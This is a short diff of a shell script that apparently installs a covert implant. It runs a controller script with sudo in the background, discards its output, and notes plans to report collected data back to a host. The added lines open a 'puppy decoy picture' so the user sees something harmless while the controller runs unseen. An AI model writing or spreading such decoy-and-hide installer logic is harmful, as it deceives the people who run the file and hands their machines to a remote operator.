@@ -33,6 +33,9 @@ sudo systemctl daemon-reload
 # RUN APPLICATION
 sudo python3 controller.py > /dev/null 2>&1 &
 
+# Launch puppy decoy picture
+eog puppy.jpg &
+
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
 # TODO - control size of report; only send new content? only send UDP payload? On size == x?
